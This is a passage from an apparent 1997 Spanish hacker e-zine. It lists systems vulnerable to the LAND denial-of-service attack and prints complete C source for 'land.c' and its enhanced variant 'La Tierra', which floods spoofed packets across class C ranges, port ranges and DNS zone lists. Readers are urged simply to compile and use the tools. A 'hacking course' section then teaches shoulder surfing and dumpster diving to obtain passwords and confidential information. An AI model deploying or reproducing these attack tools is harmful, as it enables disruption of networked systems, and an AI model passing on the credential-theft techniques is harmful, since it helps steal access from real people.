  descubierto por m3lt y su mail es meltman@lagged.net

        Lista actualizada de sistemas afectados por este ataque: 

  AIX 3                                   vulnerable
  AIX 3.2                                 vulnerable
  AIX 4                                   No vulnerable
  AIX 4.1                                 No vulnerable
  AIX 4.2.1                               No vulnerable
  AmigaOS AmiTCP 4.0demo                  No vulnerable
  AmigaOS AmiTCP 4.2 (Kickstart 3.0)      vulnerable
  AmigaOS Miami 2.0                       No vulnerable
  AmigaOS Miami 2.1f                      No vulnerable
  AmigaOS Miami 2.1p                      No vulnerable
  AmigaOS Miami 2.92c                     No vulnerable
  BeOS Preview Release 2 PowerMac         vulnerable
  BSDI 2.0                                vulnerable
  BSDI 2.1 (vanilla)                      vulnerable
  BSDI 2.1 (K210-021,K210-022,K210-024)   No vulnerable
  BSDI 3.0                                No vulnerable
  DG/UX R4.12                             No vulnerable
  Digital UNIX 3.2c                       No vulnerable
  Digital UNIX 4.0                        No vulnerable
  Digital VMS ???                         vulnerable
  FreeBSD 2.1.6-RELEASE                   No vulnerable
  FreeBSD 2.2.2-RELEASE                   No vulnerable
  FreeBSD 2.2.5-RELEASE                   vulnerable
  FreeBSD 2.2.5-STABLE                    vulnerable (fixed)
  FreeBSD 3.0-CURRENT                     vulnerable (fixed)
  HP External JetDirect Print Servers     vulnerable
  HP-UX 9.03                              No vulnerable
  HP-UX 10.01                             No vulnerable
  HP-UX 10.20                             No vulnerable
  IBM AS/400 OS7400 3.7                   vulnerable (100% CPU)
  IRIX 5.2                                vulnerable
  IRIX 5.3                                vulnerable
  IRIX 6.2                                No vulnerable
  IRIX 6.3                                No vulnerable
  IRIX 6.4                                No vulnerable
  Linux 1.2.13                            No vulnerable
  Linux 2.1.65                            No vulnerable
  Linux 2.0.30                            No vulnerable
  Linux 2.0.32                            No vulnerable
  MacOS MacTCP                            vulnerable
  MacOS OpenTransport 1.1.1               No vulnerable
  MacOS 7.1p6                             No vulnerable
  MacOS 7.5.1                             No vulnerable
  MacOS 7.6.1 OpenTransport 1.1.2         vulnerable (not a compleate lockup)
  MacOS 8.0                               vulnerable (TCP/IP stack crashed)
  MVS OS390 1.3                           No vulnerable
  NetApp NFS server 4.1d                  vulnerable
  NetApp NFS server 4.3                   vulnerable
  NetBSD 1.1                              vulnerable
  NetBSD 1.2                              vulnerable
  NetBSD 1.2a                             vulnerable
  NetBSD 1.2.1                            vulnerable (fixed)
  NetBSD 1.3_ALPHA                        vulnerable (fixed)
  NeXTSTEP 3.0                            vulnerable
  NeXTSTEp 3.1                            vulnerable
  Novell 4.11                             vulnerable (100% CPU for 30 secs)
  OpenBSD 2.1                             (conflicting reports)
  OpenBSD 2.2                             No vulnerable
  OpenVMS 7.1 with UCX 4.1-7              vulnerable
  OS/2 3.0                                No vulnerable
  OS/2 4.0                                No vulnerable
  QNX 4.24                                vulnerable
  Rhapsody Developer Release              vulnerable
  SCO OpenServer 5.0.2 SMP                vulnerable
  SCO OpenServer 5.0.4                    vulnerable (kills networking)
  SCO Unixware 2.1.1                      vulnerable
  SCO Unixware 2.1.2                      vulnerable
  Solaris 2.4                             No vulnerable
  Solaris 2.5.1                           No vulnerable
  Solaris 2.5.2                           No vulnerable
  Solaris 2.6                             No vulnerable
  SunOS 4.1.3                             vulnerable
  SunOS 4.1.4                             vulnerable
  Ultrix ???                              No vulnerable
  Windows 95 (vanilla)                    vulnerable
  Windows 95 + Winsock 2 + VIPUPD.EXE     vulnerable
  Windows NT (vanilla)                    vulnerable
  Windows NT + SP3                        vulnerable
  Windows NT + SP3 + simptcp-fix          vulnerable
  3Com Accessbuilder 600/700              No vulnerable
  3Com LinkSwitch 1000                    No vulnerable
  3Com OfficeConnect 500                  No vulnerable
  3Com SuperStack II Switch 1000          vulnerable
  Adtran TSU Rack                         No vulnerable
  Apple LaserWriter                       vulnerable
  Ascend 4000 5.0Ap20                     No vulnerable
  Ascend Pipeline 50 rev 5.0Ai16          No vulnerable
  Ascend Pipeline 50 rev 5.0Ap13          No vulnerable
  BayNetworks MARLIN 1000 OS (0).3.024(R) No vulnerable
  BinTec BIANCA/BRICK-XS 4.6.1 router     vulnerable
  Cisco Classic IOS < 10.3, early 10.3, 11.0, 11.1, and 11.2 vulnerable
  Cisco IOS/700                           vulnerable
  Cisco Catalyst                          vulnerable
  Digital VT1200                          vulnerable
  Farallon Netopia PN440                  vulnerable
  HP Envizex Terminal                     vulnerable
  LaserJet Printer                        No vulnerable
  Livingston Office Router (ISDN)         vulnerable
  Livingston PM ComOS 3.3.3               No vulnerable
  Livingston PM ComOS 3.5b17 + 3.7.2      No vulnerable
  Livingston PM ComOS 3.7L                No vulnerable
  Livingston PM ComOS 3.7.2               No vulnerable
  Livingston Enterprise PM 3.4 2L         No vulnerable
  Livingston T1/E1 OR                     vulnerable
  Milkyway Blackhole Firewall 3.0 (SunOS) vulnerable
  Milkyway Blackhole Firewall 3.02(SunOS) vulnerable
  NCD X Terminals, NCDWare v3.1.0         vulnerable
  NCD X Terminals, NCDWare v3.2.1         vulnerable
  Netopia PN440 v2.0.1                    vulnerable
  Proteon GT60                            No vulnerable
  Proteon GT60Secure                      No vulnerable
  Proteon GT70                            No vulnerable
  Proteon GT70Secure                      No vulnerable
  Proteon GTAM                            No vulnerable
  Proteon GTX250                          No vulnerable
  Proteon RBX250                          No vulnerable
  Sonix Arpeggio                          No vulnerable
  Sonix Arpeggio +                        No vulnerable
  Sonix Arpeggio Lite                     No vulnerable

        El codigo aqui expuesto hace el ataque descrito anteriormente, por lo
  que solo lo tienes que compilar y listos, je je je. Logicamente es solo
  para los que tengan un linux a mano.

------------ Codigo Fuente ---------------------------------------------------

  /* land.c by m3lt, FLC
     crashes a win95 box */


  #include &lt;stdio.h>
  #include &lt;netdb.h>
  #include &lt;arpa/inet.h>
  #include &lt;netinet/in.h>
  #include &lt;sys/types.h>
  #include &lt;sys/socket.h>
  #include &lt;netinet/ip.h>
  #include &lt;netinet/ip_tcp.h>
  #include &lt;netinet/protocols.h>

  struct pseudohdr
  {
        struct in_addr saddr;
        struct in_addr daddr;
        u_char zero;
        u_char protocol;
        u_short length;
        struct tcphdr tcpheader;
  };

  u_short checksum(u_short * data,u_short length)
  {
        register long value;
        u_short i;

        for(i=0;i<(length>>1);i++)
                value+=data[i];

        if((length&1)==1)
                value+=(data[i]<<8);

        value=(value&65535)+(value>>16);

        return(~value);
  }

  int main(int argc,char * * argv)
  {
        struct sockaddr_in sin;

        struct hostent * hoste;
        int sock;
        char buffer[40];
        struct iphdr * ipheader=(struct iphdr *) buffer;
        struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct
  iphdr));
        struct pseudohdr pseudoheader;

        fprintf(stderr,"land.c by m3lt, FLC\n");
        if(argc<3)
        {
                fprintf(stderr,"usage: %s IP port\n",argv[0]);
                return(-1);
        }

        bzero(&sin,sizeof(struct sockaddr_in));
        sin.sin_family=AF_INET;

        if((hoste=gethostbyname(argv[1]))!=NULL)

                bcopy(hoste->h_addr,&sin.sin_addr,hoste->h_length);
        else if((sin.sin_addr.s_addr=inet_addr(argv[1]))==-1)
        {
                fprintf(stderr,"unknown host %s\n",argv[1]);
                return(-1);
        }

        if((sin.sin_port=htons(atoi(argv[2])))==0)
        {
                fprintf(stderr,"unknown port %s\n",argv[2]);
                return(-1);
        }

        if((sock=socket(AF_INET,SOCK_RAW,255))==-1)
        {
                fprintf(stderr,"couldn't allocate raw socket\n");
                return(-1);
        }


        bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));
        ipheader->version=4;
        ipheader->ihl=sizeof(struct iphdr)/4;
        ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));

        ipheader->id=htons(0xF1C);
        ipheader->ttl=255;
        ipheader->protocol=IP_TCP;
        ipheader->saddr=sin.sin_addr.s_addr;
        ipheader->daddr=sin.sin_addr.s_addr;

        tcpheader->th_sport=sin.sin_port;
        tcpheader->th_dport=sin.sin_port;
        tcpheader->th_seq=htonl(0xF1C);
        tcpheader->th_flags=TH_SYN;
        tcpheader->th_off=sizeof(struct tcphdr)/4;
        tcpheader->th_win=htons(2048);


      bzero(&pseudoheader,12+sizeof(struct tcphdr));
      pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
      pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
      pseudoheader.protocol=6;
      pseudoheader.length=htons(sizeof(struct tcphdr));
      bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct
  tcphdr));
      tcpheader->th_sum=checksum((u_short *) &pseudoheader,12+sizeof(struct
  tcphdr));

        if(sendto(sock,buffer,sizeof(struct iphdr)+sizeof(struct
  tcphdr),0,(struct sockaddr *) &sin,sizeof(struct sockaddr_in))==-1)
        {
                fprintf(stderr,"couldn't send packet\n");
                return(-1);
        }

        fprintf(stderr,"%s:%s landed\n",argv[1],argv[2]);

        close(sock);
        return(0);
  }

------------ FIN -------------------------------------------------------------

        Por desgracia, este ataque no es efectivo si el objetivo tiene la
   actualizacion VTCPUPD ( la actulizacion del ataque OOB ) ademas del
   Winsock 2, ya que arregla el problema.

        Este parche esta disponible en:

   http://support.microsoft.com/download/support/mslfiles/Vtcpupd.exe

        Ahora viene otro programa muy intersante que seguro que os gustara
  mucho mas que el LAND :), pero por supuesto tened cuidado si jugais con
  este ya que es bastante mas complejo.

        Este programa es una variante del land pero mejorada en gran mediada.
  Consiste en enviar a un NT el mismo paquete que en el land pero a mas de un
  puerto cosa que el land no hacia. En principio parece que no importa si el
  puerto esta abierto o cerrado ya que lo ataca igual, tampoco parece que no
  importa si el NT no le deja al programa enviar el paquete al mismo puerto
  varias veces ya que para superar esto solo tenemos que cambiar de puerto y
  despues volver al puerto de antes tranquilamente :). Esto funciona con el
  puerto 139 a la perfeccion.

        Ademas señalar que este programa tiene varias ocpiones, que las
   describo ahora:

        - Capacidad para lanzar DoS a una direccion de clase C.
        - Capacidad para especificar el puerto de comienzo y el de
          finalizacion.
        - Capacidad para especificar el numero de loops o dejarlo en un
          bucle infinito.
        - El usuario puede modificar la cabecera TCP: fin, syn, reset,
          push, ack y urgent.
        - Tambien otras opciones de IP como window_size, time-to-time,
          sequence_number y message_type.
        - Capacidad para leer el DNS de una direccion IP.
        - Capacidad para leer en un fichero ASCII una direccion IP.

------------ Codigo Fuente ---------------------------------------------------

/*
La Tierra v1.0b  - by MondoMan (KeG), elmondo@usa.net
       Modified version of land.c by m3lt, FLC
To compile latierra, type:
 gcc latierra.c -o latierra
 To see the help screen, use 'latierra -h'
This program crashes Windows 95, and will cause Windows NT
4.0, SP3 to utilize a high percentage of CPU.  In some
instances, CPU usage reaches %100.              
Final Note:
Please use this program for in-house testing purposes only.
Just because your sending spoofed packets, doesn't mean you
can't be traced.
Good luck.
- MondoMan
elmondo@usa.net
*/
/**************************************************************/
/*                                                            */
/*  La Tierra v1.0b  - by MondoMan (KeG), elmondo@usa.net     */
/*                                                            */
/*  Modified version of land.c by m3lt, FLC                   */
/*                                                            */
/*  Compiled on RedHat Linux 2.0.27, Intel Pentium 200Mhz     */
/*  gcc version 2.7.2.1       tabs set to 3                   */
/*                                                            */
/*  gcc latierra.c -o latierra                                */
/*                                                            */
/**************************************************************/
#include &lt;stdio.h>
#include &lt;getopt.h>
#include &lt;string.h>
#include &lt;netdb.h>
#include &lt;arpa/inet.h>
#include &lt;netinet/in.h>
#include &lt;sys/types.h>
#include &lt;sys/socket.h>
#include &lt;netinet/ip.h>
#include &lt;netinet/ip_tcp.h>
#include &lt;netinet/protocols.h>
#define DEFAULT_FREQUENCY  1
#define TRUE       1
#define FALSE        0
#define FOR_EVER      -5
#define LIST_FILE      1
#define ZONE_FILE      2
#define MAXLINELENGTH    512
#define DEFAULT_SEQ    0xF1C
#define DEFAULT_TTL           0xFF
#define DEFAULT_TCPFLAGS      (TH_SYN | TH_PUSH)
#define DEFAULT_WINSIZE       0xFDE8
struct pseudohdr
 {
   struct in_addr saddr;
   struct in_addr daddr;
   u_char zero;
   u_char protocol;
   u_short length;
   struct tcphdr tcpheader;
 };
typedef struct latierra_data
 {
 char dest_ip[256];
 int  tcp_flags;
 int  window_size;
 int  ip_protocol;
 int  sequence_number;
 int  ttl;
 int  supress_output;
        int  message_type;
 } LATIERRA_DATA;
void alternatives(void);
int  get_ip(int use_file, FILE *fp, char *buff);
int  land(LATIERRA_DATA *ld, int port_number);
void nslookup_help(void);
void print_arguments(void);
void protocol_list(void);
/********/
/* main */
/********/
int main(int argc, char **argv)
{
 FILE *fp;
 LATIERRA_DATA ld;
 int frequency = DEFAULT_FREQUENCY, x;
 int beginning_port=1, octet=1, scan_loop=0, loop_val=0, use_file=FALSE;
 int ending_port = 0, loop = TRUE, i = 0, increment_addr = FALSE;
   char got_ip = FALSE, got_beg_port = FALSE;
 char class_c_addr[21], filename[256], buff[512], valid_tcp_flags[16];
 printf("\nlatierra v1.0b by MondoMan (elmondo@usa.net), KeG\n");
   printf("Enhanced version of land.c originally developed by m3lt, FLC\n");
 strcpy(valid_tcp_flags, "fsrpau");
 ld.tcp_flags = 0;
 ld.window_size = DEFAULT_WINSIZE;
 ld.ip_protocol = IP_TCP;
 ld.sequence_number = DEFAULT_SEQ;
 ld.ttl = DEFAULT_TTL;
 ld.message_type = 0;

 if(argc > 1 && (!strcmp(argv[1], "-a")))
  alternatives();
 if(argc > 1 && (!strcmp(argv[1], "-n")))
  nslookup_help();
 if(argc > 1 && (!strcmp(argv[1], "-p")))
  protocol_list();
 if(argc == 1 || ( (argc >= 2) && (!strcmp(argv[1], "-h"))))
  print_arguments();
 while((i = getopt(argc, argv, "i:b:e:s:l:o:t:w:p:q:v:m:")) != EOF)
  {
  switch(i)
   {
   case 't':
    for(x=0;x&lt;strlen(optarg);x++)
     switch(optarg[x])
      {
      case 'f':                        /* fin */
       ld.tcp_flags |= TH_FIN;
       break;
      case 's':                        /* syn */
       ld.tcp_flags |= TH_SYN;
       break;
      case 'r':                        /* reset */
       ld.tcp_flags |= TH_RST;
       break;
      case 'p':                        /* push */
       ld.tcp_flags |= TH_PUSH;
       break;
      case 'a':                        /* ack */
       ld.tcp_flags |= TH_ACK;
       break;
      case 'u':                        /* urgent */
       ld.tcp_flags |= TH_URG;
       break;
      default:
       printf("\nERROR: Invalid option specified [ %c ] for tcp_flags.\n\n",
       optarg[x]);
       return(-12);
       break;
      }
    break;
   case 'q':
    ld.sequence_number = atoi(optarg);
    break;
   case 'w':
    ld.window_size = atoi(optarg);
    break;
   case 'm':
    ld.message_type = atoi(optarg);
    break;
   case 'v':
    ld.ttl = atoi(optarg);
    break;
   case 'p':
    ld.ip_protocol = atoi(optarg);
    break;
   case 'o':
    ld.supress_output = TRUE;
    break;
   case 'i':
    if(strlen(optarg) > 1)
     strcpy(ld.dest_ip, optarg);
    else
     {
     printf("ERROR: Must specify valid IP or hostname.\n");
     return(-6);
     }
    got_ip = TRUE;
    break;
   case 's':
    frequency = atoi(optarg);
    break;
   case 'l':
    loop = atoi(optarg);
    break;
   case 'b':
    beginning_port = atoi(optarg);
    got_beg_port = TRUE;
    break;
   case 'e':
    ending_port = atoi(optarg);
    break;
   }
  }
 if(!ld.tcp_flags)
  ld.tcp_flags = DEFAULT_TCPFLAGS;
 if(!got_beg_port)
  {
  fprintf(stderr, "\nMust specify beginning port number.  Use -h for help
  with arguments.\n\n");
  return(-7);
  }
 if(ending_port == 0)
  ending_port = beginning_port;
 printf("\nSettings:\n\n");
   printf("  (-i)   Dest. IP Addr   : ");
 if(ld.dest_ip[strlen(ld.dest_ip) -1] == '-')
  {
  ld.dest_ip[strlen(ld.dest_ip)-1] = 0x0;
  strcpy(class_c_addr, ld.dest_ip);
  strcat(ld.dest_ip, "1");
  printf(" %s (Class C range specified).\n", ld.dest_ip);
  increment_addr = TRUE;
  octet = 1;
  }
 else
  if(strlen(ld.dest_ip) > 5)
   {
   if(strncmp(ld.dest_ip, "zone=", 5)==0)
    {
    strcpy(filename, &ld.dest_ip[5]);
    printf("%s (using DNS zone file)\n", filename);
    use_file = ZONE_FILE;
    }
   else if(strncmp(ld.dest_ip, "list=", 5) == 0)
    {
    strcpy(filename, &ld.dest_ip[5]);
    printf("%s (using ASCII list)\n", filename);
    use_file = LIST_FILE;
    }
   else
    printf("%s\n", ld.dest_ip);
   }
  else
   {
   printf("Destination specifier (%s) length must be > 7.\n", ld.dest_ip);
   return(-9);
   }
 printf("  (-b)   Beginning Port #: %d\n",     beginning_port );
 printf("  (-e)   Ending Port #   : %d\n",     ending_port );
 printf("  (-s)   Seconds to Pause: %d\n",     frequency );
 printf("  (-l)   Loop            : %d %s\n",  loop, (loop == FOR_EVER) ?
 "(forever)" : " " );
 printf("  (-w)   Window size     : %d\n",     ld.window_size );
 printf("  (-q)   Sequence Number : %X (%d)\n",ld.sequence_number,
 ld.sequence_number );
 printf("  (-v)   Time-to-Live    : %d\n",     ld.ttl);
 printf("  (-p)   IP Protocol #   : %d\n",     ld.ip_protocol );
 printf("  (-t)   TCP flags       : ");
 strcpy(buff, "");
 if( ld.tcp_flags & TH_FIN)
  strcat(buff, "fin ");
 if( ld.tcp_flags & TH_SYN)
  strcat(buff, "syn ");
 if(ld.tcp_flags & TH_RST)
  strcat(buff, "rst ");
 if(ld.tcp_flags & TH_PUSH)
  strcat(buff, "push ");
 if(ld.tcp_flags & TH_ACK)
  strcat(buff, "ack ");
 if(ld.tcp_flags & TH_URG)
  strcat(buff, "urg ");
 printf("%s\n\n", buff);

 if(ending_port < beginning_port)
  {
  printf("\nERROR: Ending port # must be greater than beginning port #\n\n");
  return(-8);
  }

 scan_loop = loop_val = loop;

 if(use_file)
  {
  if(access(filename, 0))
   {
   printf("\nERROR: The file you specified (%s) cannot be found.\n\n",
   filename);
   return(-9);
   }
  if( (fp = fopen(filename, "rt")) == NULL)
   {
   printf("ERROR: Unable to open %s.\n", filename);
   return(-10);
   }
  if(!get_ip(use_file, fp, buff))
   {
   printf("Unable to get any IP address from file %s.\n");
   return(-11);
   }
  strcpy(ld.dest_ip, buff);
  }

 while( (loop == FOR_EVER) ? 1 : loop-- > 0)
  {
  for(i=beginning_port; i <= ending_port; i++)
   {
   if(land(&ld, i))        /* go for it BaBy! */
    break;
     if(frequency)          /* make sure freq > 0 */
     {
    if(!ld.supress_output)
     printf("-> paused %d seconds.\n", frequency);
    sleep(frequency);
    }
   }
  if( (!use_file) && (loop && increment_addr) )
   {
   char temp_addr[21];
   if(++octet > 254)                        /* check for reset */
    {
    if(loop_val != FOR_EVER)        /* make sure not to distrute forever! */
     {
     if(++scan_loop > loop_val)        /* check if scanned x times */
      break;
     else
      loop = loop_val;                /* restore original value */
     }
    octet = 1;                           /* reset */
    }
   sprintf(temp_addr, "%s%d", class_c_addr, octet);
   strcpy(ld.dest_ip, temp_addr);

   if(!ld.supress_output)
    printf("** incrementing to next IP address: %s\n", ld.dest_ip);
   if(scan_loop > loop_val)
    break; /* break while loop */
   }
  else if(use_file)
   {
   if(!get_ip(use_file, fp, buff))
    break;

   loop++;
   strcpy(ld.dest_ip, buff);
   }
  } /* end while */
 printf("\nDone.\n\n");
} /* end main */
int  get_ip(int use_file, FILE *fp, char *buff)
{
 if(use_file == LIST_FILE)
  return(get_ip_from_list(fp, buff));

 return(get_ip_from_zone(fp, buff));
}
int get_ip_from_list(FILE *fp, char *buff)
{
 int ret_val;
 while(1)
  {
  ret_val = (int)fgets(buff, MAXLINELENGTH, fp);
  if((ret_val == EOF) || (ret_val == (int)NULL))
   return 0;
  if( strlen(buff) >= 7)
   if((buff[0] != ';') && (buff[0] != '['))
    {
    if( (buff[strlen(buff)-1] == '\r') || (buff[strlen(buff)-1] == '\n') )
     buff[strlen(buff)-1] = 0x0;
    return 1;
    }
  }
 return 0;
}
int get_ip_from_zone(FILE *fp, char *buff)
{
 int ret_val, i;
 char *p, delim[8];
 strcpy(delim, " \t");
 while(1)
  {
  ret_val = (int)fgets(buff, MAXLINELENGTH, fp);
  if((ret_val == EOF) || (ret_val == (int)NULL))
   return 0;
  if( strlen(buff) >= 7)
   if((buff[0] != ';')&&(buff[0] != '[') && (strncmp(buff, "ls -d", 5) != 0))
    {
    if( (p = strtok( buff, delim)) == NULL)
     continue;
    if( (p = strtok(NULL, delim)) == NULL)
     continue;
    if(strcmp(p, "A"))   /* be sure second column is an DNS A record */
     continue;

    if( (p = strtok(NULL, delim)) == NULL)
     continue;
    strcpy(buff, p);
    /* verify that we have a valid IP address to work with */
    if(inet_addr(p) == -1)
     continue;
    /* strip off training line characters */

    if( (buff[strlen(buff)-1] == '\r') || (buff[strlen(buff)-1] == '\n') )
     buff[strlen(buff)-1] = 0x0;
    return 1;
    }
  }
 return 0;
}
/************/
/* checksum */
/************/
u_short checksum(u_short * data,u_short length)
{
 register long value;
 u_short i;
 for(i = 0; i< (length >> 1); i++)
  value += data[i];
 if((length & 1)==1)
  value += (data[i] << 8);
 value = (value & 0xFFFF) + (value >> 16);
 return(~value);
}
/********/
/* land */
/********/
int land(LATIERRA_DATA *ld,  int port_number)
{
 struct sockaddr_in sin;
   int sock;
   char buffer[40];
   struct iphdr * ipheader = (struct iphdr *) buffer;
   struct tcphdr * tcpheader=(struct tcphdr *) (buffer+sizeof(struct iphdr));
   struct pseudohdr pseudoheader;
 bzero(&sin,sizeof(struct sockaddr_in));
   sin.sin_family=AF_INET;
   if((sin.sin_addr.s_addr=inet_addr(ld->dest_ip))==-1)
    {
      printf("ERROR: unknown host %s\n", ld->dest_ip);
      return(-1);
      }
 if((sin.sin_port=htons(port_number))==0)
    {
      printf("ERROR: unknown port %s\n",port_number);
      return(-2);
      }
 if((sock=socket(AF_INET,SOCK_RAW,255))==-1)
    {
      printf("ERROR: couldn't allocate raw socket\n");
      return(-3);
      }
 bzero(&buffer,sizeof(struct iphdr)+sizeof(struct tcphdr));
   ipheader->version=4;
   ipheader->ihl=sizeof(struct iphdr)/4;
   ipheader->tot_len=htons(sizeof(struct iphdr)+sizeof(struct tcphdr));
   ipheader->id=htons(ld->sequence_number);
   ipheader->ttl = ld->ttl;
   ipheader->protocol = ld->ip_protocol;
   ipheader->saddr=sin.sin_addr.s_addr;
   ipheader->daddr=sin.sin_addr.s_addr;
   tcpheader->th_sport = sin.sin_port;
   tcpheader->th_dport = sin.sin_port;
   tcpheader->th_seq = htonl(ld->sequence_number);
   tcpheader->th_flags = ld->tcp_flags;
   tcpheader->th_off = sizeof(struct tcphdr)/4;
   tcpheader->th_win = htons(ld->window_size);
   bzero(&pseudoheader,12+sizeof(struct tcphdr));
   pseudoheader.saddr.s_addr=sin.sin_addr.s_addr;
   pseudoheader.daddr.s_addr=sin.sin_addr.s_addr;
   pseudoheader.protocol = ld->ip_protocol;
   pseudoheader.length = htons(sizeof(struct tcphdr));
   bcopy((char *) tcpheader,(char *) &pseudoheader.tcpheader,sizeof(struct
   tcphdr));
   tcpheader->th_sum = checksum((u_short *) &pseudoheader,12+sizeof(struct
   tcphdr));
   if( sendto(sock,  buffer,
       sizeof(struct iphdr)+sizeof(struct tcphdr),
       ld->message_type,
       (struct sockaddr *) &sin,
       sizeof(struct sockaddr_in) )==-1)
    {
      printf("ERROR: can't send packet. (sendto failed)\n");
      return(-4);
      }
 if(!ld->supress_output)
  printf("-> packet successfully sent to: %s:%d\n", ld->dest_ip, port_number);
   close(sock);
   return(0);
}
/* End of land */
void alternatives()
{
 printf("\nAlternative command line arguments for option -i\n\n");
 printf("You can create two types of files that latierra can use to get\n");
 printf("a list of IP addresses, a simple ASCII file with each IP address\n");
 printf("appearing on each line or better yet, a DNS zone file created by\n");
 printf("nslookup. If you are unfamiliar with nslookup, specify a '-n' on
 the\n");
 printf("command line of latierra.\n\n");
 printf("Basically, latierra will walk down the list and send the spoofed
 packet\n");
 printf("to each IP address. Once the list is complete, and loop >1,the
 list\n");
 printf("is repeated. To specify that the '-i' option should use a zone
 file,\n");
 printf("specify \"zone=filename.txt\" instead of an IP address. To
 specify a \n");
 printf("simple ASCII list of IP addresses, use \"list=filename.txt\".
 Lines\n");
 printf("beginning with ';' or '[' are ignored. Lines that are not an 'A'
 \n");
 printf("record (second column)in a zone file will ignored.\n\n");
 exit(-1);
}
void nslookup_help()
{
 printf("\nNSLOOKUP help\n\n");

 printf("To see who is the DNS server for a particular domain, issue the
 following:\n");
 printf("        > set type=ns\n");
 printf("        > xyz.com\n\n");
 printf("You will see a list of the name server(s) if completed
 successfully\n\n");
 printf("To get a list of all the DNS entries for a particular domain, run
 nslookup\n");
 printf("and issue the following commands:\n");
 printf("         > server 1.1.1.1\n");
 printf("         > ls -d xyz.com > filename.txt\n\n");
 printf("Line 1 sets the server that nslookup will use to resolve a name.\n");
 printf("Line 2 requires all the information about xyz.com be written to
 filename.txt\n\n");
 exit(-1);
}
void protocol_list()
{
 printf("\nProtocol List:\n\n");
 printf("Verified:\n");
 printf("1-ICMP 2-IGMP 3-GGP 5-ST 6-TCP 7-UCL 8-EGP  9-IGP 10-BBN_RCC_MON\n");
 printf("11-NVP11 13-ARGUS 14-EMCON   15-XNET   16-CHAOS   17-UDP 18-MUX\n");
 printf("19-DCN_MEAS  20-HMP  21-PRM   22-XNS_IDP   23-TRUNK1   24-TRUNK2\n");
 printf("25-LEAF1  26-LEAF2  27-RDP   28-IRTP     29-ISO_TP4  30-NETBLT\n");
 printf("31-MFE_NSP  32-MERIT_INP  33-SEP  34-3PC   62-CFTP  64-SAT_EXPAK\n");
 printf("66-RVD     67-IPPC        69-SAT_MON   70-VISA         71-IPCV\n");
 printf("76-BR_SAT_MON   77-SUN_ND   78-WB_MON   79-WB_EXPAK   80-ISO_IP\n");
 printf("81-VMTP  82-SECURE_VMTP  83-VINES  84-TTP  85-NSFNET_IGP  86-DGP\n");
 printf("87-TCF    88-IGRP      89-OSPFIGP     90-SPRITE_RPG   91-LARP\n\n");
 printf("Supported:\n");
 printf("    6-TCP     17-UDP    (future: PPTP, SKIP) \n\n");
 exit(-1);
}
void print_arguments()
{
 printf("Arguments: \n");
 printf(" -i dest_ip = destination ip address such as 1.1.1.1\n");
 printf(" If last octet is '-', then the address will increment\n");
 printf(" from 1 to 254 (Class C) on the next loop\n");
 printf(" and loop must be > 1 or %d (forever).\n", FOR_EVER);
 printf(" Alternatives = zone=filename.txt or list=filename.txt (ASCII)\n");
 printf(" For list of alternative options, use  -a instead of -h.\n");
 printf(" -b port# = beginning port number (required).\n");
 printf(" -e port# = ending port number (optional)\n");
 printf(" -t = tcp flag options (f=fin,~s=syn,r=reset,~p=push,a=ack,
 u=urgent)\n");
 printf(" -v = time_to_live value, default=%d\n", DEFAULT_TTL);
 printf(" -p protocol = ~6=tcp, 17=udp, use -p option for complete list\n");
 printf(" -w window_size = value from 0 to ?, default=%d\n", DEFAULT_WINSIZE);
 printf(" -q tcp_sequence_number, default=%d\n", DEFAULT_SEQ);
 printf(" -m message_type (~0=none,1=Out-Of-Band,4=Msg_DontRoute\n");
 printf(" -s seconds = delay between port numbers, default=%d\n",
 DEFAULT_FREQUENCY);
 printf(" -o 1 = supress additional output to screen, default=0\n" );
 printf(" -l loop = times to loop through ports/scan, default=%d,
 %d=forever\n", 1, FOR_EVER);
 printf(" * = required     ~ = default parameter values\n\n");
 exit(-1);
}
/* End of file */

------------ FIN -------------------------------------------------------------

  Y desde aqui saludar a toda la peña de #hackers, #hack & #rejoin!!!!!!
  Grupos como - J.J.F.- , CYBERHACK, WAKANDA, UNDERHACK y todos los demas !!
  Y por supuesto : Bisho, Folixia, Fragel, Ipgh0st, Metalslug, Dillet, Riddle,
  Hadden, Guybrush, Tdp, Virux, Cy, Angelipas, S_guy, Xus y todos los que me
  dejo :)

                                                            NOBODY (c) 1997.

<────────────────────────────────────────────────────────────────────────────>
██████████████████████████████████████████████████████████████████████████████
<────────────────────────────────────────────────────────────────────────────>

                             - CURSO DE HACK - 
                                 CHAPTER II

        Pues espero que os gustase el capitulo I sobre Ingenieria Social y
  que sobre todo hayais conseguido engañar a algun lamer :) que el mundo
  esta lleno y en el irc mas todavia.

        En este capitulo seguiremos con varias cosas muy sencillas, que
  aunque parezcan muy obvias la gente no las hace y que pienso detallar
  para que lo hagais y avanzeis en vuestros conocimientos hacker. Por
  supuesto me estoy refiriendo a: Shoulder Surfing, Trashing, Pantallas
  Falsas y Key Recorder. Tambien decir que en este numero vamos a usar C y
  tambien unix pero tan poco que no os dara ningun problema.

  - Shoulder Surfing.

        Traducido a nuestra lengua seria algo asi como "surfear en los
  hombros", esto se refiere a mirar por encima de los hombros cuando la
  gente esta metiendo su login y su password. Seguramante estas pensado que
  tonteria estoy diciendo y que esto es de logica, pues lo es, pero muchas
  veces no miramos cuando nuestro compañero de la mesa de al lado esta
  metiendose en su cuenta.

        Esto da buenos resultados en lugares donde hay mucha gente y podemos
  pasar desapercibidos (universisades, colegios, cybercafes, etc...). A mi
  por ejemplo no me gusta desilusionar a un profesor cuando esta entrando en
  su cuenta ;-). Debemos tener cuidado cuando miramos porque si lo hacemos
  muy descarados se pueden dar cuenta de que le miramos y se puede liar el
  asunto. Siempre podemos disimular con un libro entre las manos :) o
  cualquier cosa que se nos ocurra.

  - Trashing.

        Esto es otra tecnica de los hackers que se traduce como "navegar en
  la basura". Aunque tambien parezca muy obvio y asqueroso, mirando en la
  basura de las grandes compañias podemos obtener mucha informacion
  interesante como por ejemplo (passwords, informacion confidencial, etc...),
  pero no solo en las grandes compañias sino tambien en la basura de los ISP,
  (Internet Server Provider, Provedor de Servicios Internet).

        Por supuesto tambien hay que tener cuidado que no nos pillen hurgando
  en la basura de una empresa por si acaso!!. Supongo que te acordaras de
  esto ya que sale en la pelicula de "Hackers".

  - Pantallas Falsas.

        Esta tecnica ya requiere un poco mas de maestria de hacking. Ademas
